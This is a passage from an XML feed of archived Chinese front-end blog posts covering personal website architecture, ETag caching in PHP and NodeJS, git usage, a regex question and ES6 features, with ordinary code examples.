Apache。五、后期优化和改进上面说了这么多，都是这七天来建站的总结，目前的状态是，博客系统已经搭建完毕，但是没有写博客和管理博客的后台，这又是件头疼的事情，不过还好，后台之后自己看得见，就随意一些。也没有归档页面、分类页等页面，这些页面的设计也是伤脑细胞的。整个网站，博客系统只是一个部分，还有其他的问答平台、好文的爬虫抓取、每月期刊、每周好文推送、邮件系统等等，工程量还蛮大，这对我来说也是一个挑战，可以尽情发挥自己的技能，也是个深度学习的好机会！页面的加载，首屏时间不能忍受，如果文章篇幅比较大，大约需要1.5到3s才渲染完毕，这个值有点不能忍受。优化方向有：PJAX，页面采用 pushState + AJAX，减少请求，不支持 pushState 的页面采用 hash bang 兼容处理。bigPipe，如果文章内容比较多，或者其他的模块有所增加，会采用 bigPipe 分拨往前端扔数据。前后端统一模板，之前也提到了这个问题，后端渲染的时候使用的后端模板，如果前端要异步加载，则需要重新写一套模板来解析合并数据，这两个模板的相似度是很高的，如果可以复用将减少很多工作量。静态数据的缓存问题ETag等对页面的标记缓存问题六、小结我最怕的是事情没有一个开始，现在既然已经开始了，我想，离结束也就不远了。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[个人网站架构设计(二)]]></title>
    <url>%2Fblog%2F2014%2F05%2F15%2F2014-05-15-cb-personal-website-design-part-2%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 网站地址：http://barretlee.com昨天对网站的架构做了一个简要的分析，有些人不太理解，有了 NodeJS 还要 php 干啥？我推荐了几篇文章给这位童鞋看了：也谈基于NodeJS的全栈式开发（基于NodeJS的前后端分离）基于前后端分离的模版探索Midway-ModelProxy &mdash; 轻量级的接口配置建模框架前后端分离模式下的安全解决方案Web 研发模式演变如果是一个很小的网站，是用那么多层来处理请求和响应，确实是冗余的，不过我打算将这个网站设计成一个实时平台，这个平台中包含了很多很多的通信模块，所有后端选用 NodeJS 作为 I/O 处理器，这是可以理解的。php 用于通信，连接消耗大，而且不方便并行处理，效率很低。在网络通信和I/O处理上，NodeJS是很优秀的工具。1. 小小网站，为啥我要如此看重后端其实最主要的原因是，我买的主机配置很低。呵呵，是的，昨天很多朋友在留言里都提到了购买云主机/VPS相关的东西。今天我也是花了不少时间在各个群里请教，并且也访问、对比了一些云主机供应商的网站。之前在 V2ex 上看到了不少相关的帖子，今天进去翻，没翻到之前点过赞的贴。过程就不多说了，开始打算买个国外的主机，不用备案~ 后来嫌麻烦，买了个阿里云服务器： 1234CPU： 1核内存： 512MB数据盘： 40G带宽： 1Mbps 买一年省俩月的钱，总共是七百多。选用的 Ubuntu 12.04, 64位系统。不过呢，我并没有一次性买一年的，先花几十块钱买了一个月，试用，反正以后续费还是原价（不像域名那样坑爹，续费就涨价）。域名我是一次性买的十年的，55/年，这东西不贵，多买几年，省事儿。然后进入阿里云的流程，正在备案中…回到重点，为啥看重后端，看到上面的配置，相比大家也知道了，搞一个实时通信的网站，每个连接后端都需要内存来处理，而且这个内存在链接断开之前是不会释放的（socket连接），目测同时在线超过30个人，系统就要卡住了。内存是一个很大的瓶颈，然后就是带宽了，1M真的很低。其实买个配置高点的主机，一年也就一两千，这次故意买个最低配置是为了让自己培养珍惜流量意识，希望编程可以考虑到每个 byte 的消耗，等这种意识（或者技术）养成了，再提高主机的配置。第二个原因就是熟悉后端，数据库方面的处理一直是自己的弱项，如果不试着提高下，以后工作中遇到坎就会很难受了。这段时间在阿里实习，经常会感觉有些知识不够用了，希望返校继续加强学习。2. 前端也是重点前端有一个很大胆的尝试，\数据在前端”。打开一个网页，浏览器发送请求到服务器，服务器从数据库里获取数据，经过后台脚本的拼装处理，然后输出到前端，这是最常见的方式。这种方式的缺点就是，频繁的读取数据库，然后还有一大堆经过HTML标签包装过的数据传到前端，期间的冗余消耗是特别大的。于是有人就想到了，后端的数据全部使用JSON方式输出，到了前端再渲染数据，这种方式获得了一定的优化效果，前端端的分离似乎也很明显，但是前端负担就太重了，数据的处理和渲染都是前台，也就是承担了Controller和Views的角色，前台很累，他累了也会发脾气，比如：数据到了，要半天之后才解析完毕，再花半天将其渲染出来。同时这种处理方式也不利于SEO。现在的尝试是，前端就是一个数据库，每个用户都有数据库数据的一个备份。 123456789101112131415161718192021222324 +----------+ | | | Database | | | +-----|----+ | +---------|----------+ /| |\ / | Server | \ / | | \ / +----|----------|----+ \ / | | \+---------/+ +------|---+ +---|------+ +\---------+| | | | | | | || Client |..| Client |..| Client |..| Client || | | | | | | |+-----|----+ +-----|----+ +-----|----+ +-----|----+ | | | |+-----|----+ +-----|----+ +-----|----+ +-----|----+| | | | | | | || Local | | Local | | Local | | Local || Storage | | Storage | | Storage | | Storage || | | | | | | |+----------+ +----------+ +----------+ +----------+ 浏览器每次连接到服务器，都会将服务器的数据同步到本地，打开页面，第一件事是呈现当前LocalStorage的数据，然后发送一个请求询问服务器，\是否有数据更新啊？”，每次只拉去更新的数据。有人会觉得这种方式不可取，本地存不了这么多东西啊。当然存不了这么多，一篇文章有作者、标题、日期、概要还有内容，我们可以在本地储存除内容之外的所有东西，就算有100篇文章，其缓存的量也不过几百KB，试想你加载个 JQ 是不是也得上百KB啊~那么每次我们从后端拉取的数据量就十分小了。至于本地储存的实现方式，这个好处理，LocalStorage、IndexDB、UserData等等，方式很多，还有一些其他比较 hack 的方式，我以后再介绍。3. 前后端之间的屏障后端会有很多的服务，比如邮件、HTTP、HTTPS、socket等等，再比如：A域名、B域名、A子域名、B子域名的处理等等。为了处理伪静态，安全，缓存，动静页面分离等多个问题，决定在昨天考虑的架构上再加一层 Nginx。 12345678910111213141516171819202122232425262728 +------------------+ +------------------+ | Front-End | | Browser | | 前端处理 | +--------------+ | | |←---→| LocalStorage | | +--↑-----↑-----↑---+ +--------------+---+ | | | | | | | | | +------------------+ | Nginx |+---- 请求/代理 ---------------------------+| | | || +------------------+ || | | | || | | | || +--↓-----↓-----↓---+ || | NodeJS | +-------------+ |+--&gt;| 处理I/O | | Database | || | |←-+-→| | || +-----|-----↑------+ | | | || | | | | | || +-----↓-----|------+ | +----------+ | || | PHP | | | | | |+--&gt;| 处理数据 |←-+-→| cache | | || | | | | | || +------------------+ +----------+--+ || |+------------------------------------------------+ 东西越多，维护成本越高，不过我竟然觉得添加一层会有更多的乐趣…后续会继续记录建站过程。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[个人网站架构设计(一)]]></title>
    <url>%2Fblog%2F2014%2F05%2F13%2F2014-05-13-cb-personal-website-design-part-1%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 网站地址：http://barretlee.com从大二开始，坚持每月3到8篇的技术分享，到现在差不多两年了。一直在分享之中跟着大家一起进步，从最开始的点点网，到github，再到现在的博客园。分享是一件有趣的事情，能够收到很多的反馈，渐渐地，已经把写博当成一种习惯。在不同的平台上写博客会有不同的感受，但是几乎没有哪个平台可以满足自己的所有需求，比如，期望没有广告、希望速度可以更快、自己可以更多的操作后端、找个地方放DEMO、有个NodeJS测试的环境、自定义样式和主题等等，对我这个喜欢折腾的人来说，这些需求真是太普通了，可惜，没有哪个平台可以提供这么多的服务。再如，我希望把更多的生活中元素或者情感的东西带到博客中来，这些平台貌似不太适合做这些事情。无奈之下只好自己花点钱买个主机安置个人网站。搭建一个网站是一个系统学习前后端的最佳机会，之前考虑过使用别人的框架，快捷搞定一个博客平台，但是我希望这次的网站架设能够承受几十万甚至上百万的PV（哈哈，这个可能性几乎为零，主要为了提高标准），同时也支持一些诸如陌生人交流，网站爬虫归类等等附加的功能。用商业性网站的建站标准来规范化网站，也给自己一个实践的机会~花了四五个小时整理了思路，考虑的东西有点多，所以通过文字将建站的整个过程记录下来。1、网站定位记录生活，分享交流。凸显交流。2、设计理念重视体验数据在前端实时更新快、稳定、安全自动化低消耗、低流量3、基本架构123456789101112131415161718+------------------+ +------------------+| Front-End | | Browser || | | || 前端处理 | +--------------+ || |←---→| LocalStorage | |+--↑-----↑-----↑---+ +--------------+---+ | | |+--↓-----↓-----↓---+| NodeJS | +-------------+| 处理I/O | | Database || |←-+-→| |+-----|-----↑------+ | | | | | | | |+-----↓-----|------+ | +----------+ || PHP | | | | || 处理数据 |←-+-→| cache | || | | | |+------------------+ +----------+--+三个重点：前端数据缓存。数据放在本地LocalStorage中，用户每次访问网站，都会从数据库拉去数据，同步到本地。低版本IE基本快死绝了，这个降级处理。NodeJS 处理I/O，如果某个页面的单日访问量太大，不至于服务器扛不住。由于全站使用socket连接，利用NodeJS也便于后端编程。数据库对针对访问频率进行cache。4、基本模块留言，多个位置使用，组件化处理自动化分享，发布文章自动分享到 SNS 上防盗链/盗链数据自动备份后台发文系统提问交流平台陌生人交流模块最新资讯的爬虫RSS聚合QQ回复/邮件自动回复功能后续会针对每个功能模块，进行详细的记录。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Etag缓存在PHP和NodeJS中的实现]]></title>
    <url>%2Fblog%2F2014%2F05%2F11%2F2014-05-11-cb-etag-in-node%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. HTTP 提供了许多页面缓存的方案，其中属 Etag 和 Last-Modified 应用最广。本文会先介绍 Etag 的应用场景，然后说说他在 php 和 node 中的使用。一、Etag的使用客户端和浏览器之间的交互： 1234567891011121314+---------+ 1 +---------+| |----------------&gt;| || | 2（200，OK） | || |&lt;----------------| || 客 | 3（Etag） | 服 || |----------------&gt;| || 户 | 4（304） | 务 || |&lt;----------------| || 端 | 3（强制刷新） | 端 || |----------------&gt;| || | 6（200，OK） | || |&lt;----------------| |+---------+ +---------+ &lt;Created By Barret Lee&gt; 1. 客户端向服务器请求资源S2. 服务器返回数据，并带上一个 Etag3. 客户端再次请求资源S，由于上次服务器给他返回了一个 Etag，这次请求的时候他会带上这个 Etag4. 服务器发现请求中包含 Etag，判断是否过期，没过期则返回 304 Not Modified5. 客户端强制刷新（如chrome中ctrl+shift+R刷新页面），请求中剔除 Etag6. 服务器未发现请求中包含 Etag，返回资源S，并带上一个 Etag二、代码实现第一次请求数据：浏览器在接受到服务器发过来的 Etag 后，会保存下来，下次请求的时候会将它放在请求头中，其 key 值为 If-None-Match。服务器拿到 If-None-Match 之后，对比之前的 Etag，如果没变，则返回 304 Not Modified.1. php 中的 Etag123456789101112&lt;?php $str = &quot;Barret Lee&quot;; $Etag = md5($str); if(array_key_exists(&apos;HTTP_IF_NONE_MATCH&apos;, $_SERVER) and $_SERVER[&apos;HTTP_IF_NONE_MATCH&apos;] == $Etag)&#123; header(&quot;HTTP/1.1 304 Not Modified&quot;); exit(); &#125; else &#123; header(&quot;Etag:&quot; . $Etag); echo $str; &#125;?&gt;Etag 是一个字符串，我们一般使用该请求对应响应输出的 md5 值作为 Etag，可以简单地理解为文件的版本号。在 php 中存在两个获取 md5 的函数，一个是针对字符串的，就是 md5()，然后就是针对文件的， md5_file()。首先判断在请求中是否包含 ‘HTTP_IF_NONE_MATCH’ 这个 key，如果包含并且其值为之前的 md5 值，则返回 304，否则输出 Etag 以及内容。2. node 中的 Etag与 php 有些不同，从 $_SERVER 中拿到的内容是经过 apache 包装过的，而 node 获取的数据是最原始的。 123456789101112131415var hashStr = &quot;A hash string.&quot;;var hash = require(&quot;crypto&quot;).createHash(&apos;sha1&apos;).update(hashStr).digest(&apos;base64&apos;);require(&quot;http&quot;).createServer(function(req, res)&#123; if(req.headers[&apos;if-none-match&apos;] == hash)&#123; res.writeHead(304); res.end(); return; &#125; res.writeHead(200, &#123; &quot;Etag&quot;: hash &#125;) res.write(hashStr); res.end();&#125;).listen(9999); 上面对 hashStr（输出的内容） 进行了简单的处理，并将其作为 Etag 放在 head 中输出，上面的代码一目了然，我就不解释了。三、小结Etag 在缓存处理中用的比较广泛，使用它可以减少一些不必要请求的带宽的占用。服务器输出的内容不变，浏览器就应该使用缓存，没必要每次都向服务器端索要数据，造成不必要的浪费。从上面我们可以看到，如果想拿到 Etag，就必须先拿到要输出的数据，所以 Etag 只能减少带宽的占用，并不能降低服务器的消耗。如果是静态页面，可以判断文件最近一次的修改时间（Last-Modified），获取文件上次修改时间的消耗比拿到整个数据的消耗要小的多。所以很多时候 Etag 都是配合这 Last-Modified 一起使用的。上面的 php 和 node 代码演示，很明显的差异就是，node 更加细致，或者说他更加底层，我们可以获取的几乎都是未加修饰的原始数据，从数据量的交互和可操控性来看，我更偏向于 node 的使用。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>PHP</tag>
        <tag>NodeJS</tag>
        <tag>Etag</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git版本管理策略及相关技巧(A)]]></title>
    <url>%2Fblog%2F2014%2F05%2F07%2F2014-05-07-cb-git-improve%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 公司几乎所有的项目都是使用 git 仓库来管理代码，以前对 git 只有些肤浅的了解，每次提交代码或者上线的时候总是会提心吊胆，生怕出现一些未知的问题。经过三个月的踩坑和填坑， git 操作颇显成熟。仅以此文回忆学习 git 的历史。一、基本操作1. 克隆代码1.1 添加仓库最直接的方式： 12cd dir # 这里不用新建一个项目名的文件夹，dir为git文件夹的父文件夹git clone //github.com/barretlee/Micro-Share 你也可以进入一个目录，然后初始化（init）： 1234cd path/to/Projectgit init# 添加远程目录git remote add origin //github.com/barretlee/Micro-Share 这些都是最基本的了，上面的 remote add 是添加一个远程目录，你也可以添加多个远程目录，什么情况下会添加多个呢？比如：我想把别人的代码处理之后放到自己的 git 仓库上去, 1234567git remote add origin //github.com/barretlee/Micro-Sharegit remote add mine http://your/path/to/git# 拉取远程代码到 init 之后的 master 主干上git fetch origin master# 修改代码之后，提交到自己的仓库git commit -am &quot;fist&quot;git push -u mine master 1.2 添加文件在提交文件之前首先要添加文件到分支中，很多人只知道： 1git add . 如果有文件删除，会发现这些删除的文件并没有被附加进去，肿么办？ 1234#方式一git add --all .#方式二git add -A . –all 参数，顾名思义，添加所有文件（change|delete|add） -A 参数，添加修改过和删除过的文件（change|delete） 不加 参数，添加修改过和添加的文件（change|add） 1.3 提交文件 1git commit -m &quot;comment&quot; 如果没有删除过文件，可以合并添加和提交文件为一步： 1git commit -am &quot;add and commit&quot; 1.4 远程提交提交到远程仓库上： 12# 将 master 提交到 origin 上git push origin master 这一步操作可能会出现很多的问题，比如：a) origin为一个多人开发的库，别人在你提交之前已经向 origin 上提交过一次（或者多次），那么此时你的版本是落后于远程服务器版本的，你需要先拉去线上最新的代码： 12# 拉去远程分支到 mastergit pull origin master b) 执行 a) 之后，有可能也会有提醒：存在冲突，需要合并分支，这个在后面会提到c) 如果你很自信，觉得线上的版本是存在问题，你这个版本木有问题，你可以强制提交你的代码 1git push -u origin master -f 这里需要特别注意，加了 -f 线上之前的修改就会被删掉，请谨慎使用！二、进阶操作指南上面是最基本的几条命令，初用 git 的童鞋一般也只会接触这些东西，在一些复杂的多人开发项目中，修改代码、合并代码十分频繁，上面的命令显然是不够用了。在介绍进阶命令之前，先了解下 git 的三种状态。 123456789+-----------+ +-----------+ +-----------+| | | | | || working | --&gt; | index | --&gt; | commit || | | | | |+-----------+ +-----------+ +-----------+ ↓ ↓ ↓ 当前操作 git add git commit &lt;Created By Barret Lee&gt; 你当前的操作状态下，所有文件的状态都在 work 状态，当你执行 git add 之后，文件状态变为 index，也就是在 git 中已经有过一次登记了，而 git commit 之后就被编入了分支，成为 commited 状态了。需要注意的是，这三种状态一直存在，只是会有不同的文件来对应这些状态。1. 场景切换Barret 有一天敲代码，代码敲了一半，Boss 跟他说，线上出了个 bug，赶紧的，去修复！咋办？上面那堆代码，敲了半个上午啊，重新新建一个文件夹，然后把线上代码再克隆一次修改？这种处理的成本显然太高了！其实 git 为我们提供了很好用的命令 git stash。只要在当前目录下操作： 1git stash 这句命令执行完毕之后，git 管理区中的 stash 会多出一条记录，这条记录保存了上一次提交到目前，你所有的修改: 1last commit ... working file now 接着你就可以修改你的 bug 了，修改完了之后，再使用 1git stash pop 将之前保存的修改（场景）还原回来。其内部的原理也是很简单的： 1234567891011121314151617181920+---------------+ +-----------+ +-----------+ +-----------+| | | | | | | || last commit | --&gt; | working | --&gt; | index | --&gt; | commit || | | | | | | |+---------------+ ↑ +-----------+ +-----------+ | +-----------+ ↓ | ↓ ↓ | ↓ 上次提交 | 当前操作 git add | git commit | s| | t| | +---------+ a| | | Stash 0 | s| | +---------+ h| +------ | Stash 1 | &lt;------------------+ +---------+ | .... | +---------+ | Stash n | +---------+ ↓ &lt;Created By Barret Lee&gt; stash堆栈 有些童鞋可能看不太懂上面的图，git 有一个场景（stash）堆栈，这个堆栈的作用是用于保存修改的，下面举个例子： 123456# 进入文件夹$ cd test# 初始化 git$ it init# 新建四个文件$ touch f1 f2 f3 f4 上面初始化一个 git ，然后新建了四个文件 1234# 修改 f1$ echo &quot;1&quot; &gt; f1# 将修改 push 到 stash 栈堆中$ git stash 上面修改了文件 f1，并保存到场景栈堆中 123# 查看 stash 栈堆$ git stash list stash@&#123;0&#125;: WIP on master: 7f58be2 3 查看栈堆，可以看到 stash@{0} 123456# 修改 f2$ echo &quot;1&quot; &gt; f2# 添加修改$ git add .# 将修改 push 到 stash 栈堆中$ git stash 修改文件 f2，添加之后保存到栈堆之中 1234# 查看 stash 栈堆$ git stash list stash@&#123;0&#125;: WIP on master: 7f58be2 3 stash@&#123;1&#125;: WIP on master: 7f58be2 3 栈堆中多了一个 stash@{1}，这个时候我们去修复 bug，改变其他位置的代码，完了之后： 12# pop 栈堆，还原修改$ git stash pop 上面我们将栈堆 pop 出来，遵循后进先出的规则 12345# 查看文件状态git status$ Changes not staged for commit: changed: f2 please commit it 以上代码都是我手动敲出来的，不是复制控制台的代码，大概就是这个么意思吧。关于 stash 的最后一个想说明的命令是： 1git stash clear 清空场景（stash）堆栈。2. 代码 diff2.1 HEAD在介绍这块之前，也需要先了解几个基本的常识：HEAD&nbsp; &nbsp; &nbsp;它表示上一次的 commit 版本HEAD~n 它表示第上 n 词的 commit 版本，这里的 n 是大于等于 1 的整数如果我们要比较上一次和这一次代码之间的差异，可以： 1git diff HEAD~1 HEAD 比较前第三次与现在代码的差异，可以： 1git diff HEAD~3 HEAD 获取前第n次的还有另外一种方式，如前第二次： 1HEAD^^ 前第五次： 1HEAD^^^^^ 这样写起来比较累，还是前面的方式比较顺手。2.2 SHA关于 SHA 标识的介绍，我这里就懒得打字了，可以看我之前分享的一点东西，使用 1git log 可以看到每次 commit 的 SHA 标识。要比较两次提交之间的差异，可以直接 1git diff SHA1 SHA2 其中 SHA1 和 SHA2 是两次提交（commit）时的标识。2.3 与场景的比较这个用的比较少，对比目前代码跟最近一次 push 的场景代码差异： 1git diff --cached 从字面上也好理解，就是跟缓存的文件做对比嘛~3. 版本回退如果上面的 SHA，working，index，commit 几种状态和标识没有弄明白，相信这里也是十分难理解的。版本回退使用的命令是： 1git reset 3.1 三种操作这个命令后面是要加参数的，分别为：a) filename 1git reset HEAD filename # 从暂存区移除文件 如果之前有 add filename，上面的命令操作之后，filename 将处于未被 add 的状态。也就是从 index 转变成 working 状态。b) HEAD 1git reset --hard HEAD~n 直接回退到前第 n 个版本。c) SHA 1git reset --hard SHA 回到 SHA 对应的 commit 的版本。3.2 三种方式上面我们使用的是 –hard 来 reset 代码，这样风险是特别大的，这里有三个可选参数：–hard 回退版本，代码也回退，忽略所有修改–soft 回退版本，代码不变，回退所有的 add 操作–mixed 回退版本，代码不变，保留 add 操作4. 分支处理4.1 查看分支 1git branch 这是最简单的查看，查看本地创建了哪些分支。 1git branch -va 查看本地+远程分支，及其详细信息（上次提交commit信息）4.2 添加分支 1git branch branch_name 如果你当前所在的分支是 master，此处创建的分支会直接继承 master 的所有修改历史。 1git branch -b branchnew branchold -b 是 base 的意思，如果你有两个分支 A 和 B ，目前在 A 分支上，你先新建一个分支继承 B，此刻你有两个选择： 1234567# 选择一# 先切换到 B 分支上git checkout Bgit branch C# 选择二git branch -b C B 4.3 切换分支a) 切换到本地分支 1git checkout branch_name b) 切换到远程分支 12git checkout remotes/origin/branch_namegit checkout branch_name 详情请看之前分享的这篇文章，git切换到远程分支4.4 删除分支显切换到别的分支上，然后 1git branch -d branch_name 如果是远程分支： 1git push origin :branch_name 在需要删除的分支前面加一个冒号OK了，push 上去之后，服务器上的分支自然就被删除了。由于想写的内容实在太长，故打算下次再补充第二部分。下期预告： 本节补充： 5. tag处理 6. 仓库管理 第三章 版本管理策略 第四章 看懂 diff 第五章 配置别名 下次再做小结。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则中分支示例]]></title>
    <url>%2Fblog%2F2014%2F05%2F04%2F2014-05-04-branch-in-regexp%2F</url>
    <content type="text"><![CDATA[问题： &quot;baddad&quot;.match(/([bd]ad?)*/) 为什么匹配的是dad而不是bad。 回答： 不是不匹配bad，而是已经匹配过了，* 号为贪婪模式，所以第一次匹配到 bad 之后会继续往后吞并字符，最后发现后面还有一个 dad 也适合，于是便把 baddad 全部匹配了，第二次匹配是分支匹配，前面的 [bd] 是两个分支，刚才第一个分支已经匹配完了，进入第二个分支，也就是匹配 dad，所以第二个结果是dad就显而易见了。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMAScript 6入门]]></title>
    <url>%2Fblog%2F2014%2F05%2F02%2F2014-05-02-cb-ecmascript6-overview%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 预计在2014年底，ECMAScript 6将会正式发布，他的草案在13年3月份被冻结，后续提出新特性将会移至ECMASript 7中。目前还没有哪款浏览器实现了ES6的全部内容，兼容性最强的一款要数FireFox了。具体情况可以在这里查看。关于 ECMAScript 6 草案，我在博客里头复制了一份，可以点击这里。JavaScript的内容是越来越丰富，在ES6中还添加了模块（module）和类（class），感觉他已经失去了曾经的单纯了，不知道这些新功能的补充对开发者来说是福音还是负担。之前写过两篇关于ES6的文章，ECMAScript 6 简介 和 ECMAScript 6中的let和const关键词，本文将一一介绍ES6中的一些新特性。注意：如果想测试以下属性，请安装 0.11+ 版本的 node，并添加上 –harmony 参数。一、let 和 const这个内容在 ECMAScript 6中的let和const关键词&nbsp;一文中已经介绍过了。简单来说就是一句话：ES6中引入了块级作用域，let的有效区间是他所在的 {} 大括号中。const 为常量，定义之后不能更改，也删除不了。 12&gt; const PI = 3.14;&gt; Object.getOwnPropertyDescriptor(window, PI)Object &#123;value: 3.1415, writable: false, enumerable: true, configurable: false&#125; writable 和 configurable 都是 false。二、多变量的模式赋值写过 coffee-script 的人都知道，我们可以这样给一个数据赋值： 1num[1..3] = [&quot;hello&quot;, &quot;i&apos;am&quot;, &quot;Barret Lee&quot;] ES6中也允许类似的多变量赋值： 1var [x, y, z] = [&quot;hello&quot;, &quot;i&apos;am&quot;, &quot;Barret Lee&quot;]; 更强大的是，他还适合对象： 1var &#123; foo, bar &#125; = &#123; foo: &quot;Barret&quot;, bar: &quot;Lee&quot; &#125;; 这种赋值方式是模式匹配的，只要左侧跟右侧对应，便可以成功赋值。感觉新手不会太适应这种写法。三、数组推导先看例子： 1234var a1 = [1, 2, 3, 4];var a2 = [i * 2 for (i of a1)];a2 // [2, 4, 6, 8] 这东西只是简化了编程，没有从根本上增加功能和特性，写 coffee 的人应该比较喜欢，我看着还是有点不习惯，其实上面的写法就等价于： 12var a1 = [1, 2, 3, 4];var a2 = a1.map(function (i) &#123; return i * 2 &#125;); 我想除非是代码长度有限制，否则这玩意儿正式出来了我也不会用它。四、字符串的扩展这一块的内容相当于是给 JS 编码打一个补丁，这个补丁用来弥补双字节 UTF-16 字符带来的问题，引入的各个函数也只是对不同场景的修复。这个扩展还是相当重要的，尤其是 ArrayBuffer 中数据类型的相关处理，涉及到很多类似 Float64Array Uint32Array 等类型化数组的处理，我在 你所不知道的JavaScript数组 曾提到过。1. codePointAt这个地方需要解释下 JavaScript 对字符的储存模式，JavaScript 中的字符串是以 UTF-16 为代码单元，通常我们使用的字符范围都在 Unicode 值 0x10000 以内，他们对应的 UTF-16 就是它们自身，但 Unicode 中也存在这个范围之外的字符，这时候就需要两个 UTF-16 字符来描述，比如： 1alert(&quot;𠐀&quot;.length); //2 因为字符串的 length 表示的并不是字符个数，而是 UTF-16 的单元个数。关于这方面知识的具体介绍，可以戳这里。ES6提供了 codePointAt 函数来正确处理 4 个字节储存的字符。 12var s = &quot;𠐀二&quot;;s.codePointAt(0); codePointAt 会把 s 中的两个字符都正确解析出来，相当于智能的将储存单元切换为 2 或者 4.2. fromCodePoint对应 String.fromCharCode 的能够智能解析 s 的函数是 String.fromCodePoint3. 字符的Unicode表示法我们知道可以使用 \u0000-\uFFFF 来表示一个 Unicode 字符，依然是上面的问题，如果字符超出了这个范围，比如 “\u10000” 这个字符，便不能正确的解析出来，ES6中可以这样： 1#\u&#123;10000&#125; 用大括号括起来就可以正常解析超过 FFFF 的字符了。4. 正则修饰符 u123/^.$/.test(&quot;𠐀&quot;) // false/^..$/.test(&quot;𠐀&quot;) // true/^.$/u.test(&quot;𠐀&quot;) // true看到上面三个测试，相信你已经知道是什么意思了。5. 几个没啥意思的函数contains(), startsWith(), endsWith(), repeat()都是对 String 的拓展，顾名就能思意。6. 模板字符串之前写过一篇关于 TEMPLATE 标签的文章，这里我们又看到了一个跟模板相关的东西。 12345678// 字符串中嵌入变量var name = &quot;Bob&quot;, time = &quot;today&quot;;`Hello $&#123;name&#125;, how are you $&#123;time&#125;?`var x = 1;var y = 2;console.log(`$&#123; x &#125; + $&#123; y &#125; = $&#123; x + y&#125;`)// &quot;1 + 2 = 3&quot; 配合 TEMPLATE 标签使用是比较方便的，不过 TEMPLATE 标签可以很方便的使用自定义标签，这个特性也不是很突出了。 123456789101112131415&lt;div id=&quot;test&quot;&gt; &lt;x-from&gt;DOM文档&lt;/x-from&gt; &lt;x-name&gt;test元素&lt;/x-name&gt;&lt;/div&gt;&lt;template id=&quot;temp&quot;&gt; 我是来自 &lt;strong&gt;&lt;content select=&quot;x-from&quot;&gt;&lt;/content&gt;&lt;/strong&gt; 中的 &lt;strong&gt;&lt;content select=&quot;x-name&quot;&gt;&lt;/content&gt;&lt;/strong&gt; 的数据。&lt;/template&gt;&lt;script&gt;var root = test.webkitCreateShadowRoot();root.appendChild(document.importNode(temp.content));&lt;/script&gt; 五、数值的扩展 1. 二进制和八进制表示法 120b111110111 === 503 // true0o767 === 503 // true 前缀 0b 和 0o 表示二进制和八进制数值2. 扩展函数Number.isFinite()Number.isNaN()Number.parseInt()Number.parseFloat()Number.isInteger()具体细节可以去 MDN 上搜查。六、对象的扩展在 ES5.1 中我们看到了 Object 的灵活性提高了很多，加入了 create、defineProperty、freeze 等等很多十分有用的方法，而在 ES6 中，依然继续加强：1. Object.is()比较严格相等，传入两个参数，其功能跟 === 差不多，不同的是：+0不等于-0，NaN与本身恒等 12345+0 === -0 //trueNaN === NaN // falseObject.is(+0, -0) // falseObject.is(NaN, NaN) // true 2. proto属性 1obj.__proto__ = otherObj; 这东西浏览器早就实现了，只是在 ES6 才被纳入标准中，还记得这东西被用来判断是否为 IE 么： 1var isIE = &quot;__proto__&quot; in &#123;&#125; ? false : true; 3. 增强的对象写法又是一个装饰品：12345678910var Person = &#123; name: &apos;Barret Lee&apos;, //等同于birth: birth birth, // 等同于hello: function ()... hello() &#123; console.log(&apos;My Name Is&apos;, this.name); &#125;&#125;;4. 允许变量渗入 key 中 12345678var name = &quot;my name&quot;;var Me = &#123; [name]: &quot;Barret Lee&quot;, &quot;name&quot;: &quot;李靖&quot;&#125;;Me[name] // &quot;Barret Lee&quot;Me[&quot;my name&quot;] // &quot;Barret Lee&quot;Me[&quot;name&quot;] // &quot;李靖&quot; 挺方便的，不过容易出错，比如上面，看晕了吧~5. Symbol一种从类型上区分数据的工具，他是一个原始类型的值，不是对象，很适合做标识符。6. ProxyProxy 内置的一个代理工具，使用他可以在对象处理上加一层屏障： 1234567891011var plain = &#123; name : &quot;Barret Lee&quot;&#125;;var proxy = new Proxy(plain, &#123; get: function(target, property) &#123; return property in target ? target[property] : &quot;我擦&quot;; &#125;&#125;);proxy.name // &quot;Barret Lee&quot;proxy.title // &quot;我擦&quot; Proxy(target, handler), 这里的 handler 可以是 set get has hasOwn keys 等等方法，具体可以移步这里：http://wiki.ecmascript.org/doku.php?id=harmony:direct_proxies七、函数的扩展1. 参数设置默认值1234567function Point(x = 0, y = 0) &#123; this.x = x; this.y = y;&#125;var p = new Point();// p = &#123; x:0, y:0 &#125;他这个参数可以初始化相当于暴露更多的底层接口吧，提高了函数的拓展性。2. rest运算符（…）12345678910function add(...values) &#123; let sum = 0; for (var val of values) &#123; sum += val; &#125; return sum;&#125;add(1, 2 ,3) // 6这里的 values 需要用 val of values 来遍历。3. 箭头函数（=&gt;）之前写过 coffee ，所以对这个我还是比较熟悉的： 1var f = (a, b) =&gt; &#123;return a + b&#125;; 这个跟上面提到的一些内容一样，都是装饰性的，没太多用途。八、Set和Map数据结构1. Set简单点解释，他就是一个没有重复数值的数组。或者说他就是一个数组的 hash 表。 1234var items = new Set([1,2,3,4,5,5,5,5]);for (i of s) 